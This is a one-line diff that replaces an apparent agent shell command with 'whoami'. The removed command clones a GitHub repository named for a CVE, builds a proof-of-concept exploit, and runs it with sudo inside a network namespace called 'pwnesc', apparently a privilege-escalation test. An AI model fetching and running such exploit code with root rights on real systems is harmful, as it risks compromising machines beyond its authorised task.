@@ -1,1 +1,1 @@
-cd /home/claude; git clone https://github.com/PeronGH/CVE-2026-99999; cd CVE-2026-99999; go build -o poc . ; sudo ./scripts/setup.sh ; sudo ip netns exec pwnesc ./poc; sudo ./scripts/teardown.sh
+whoami
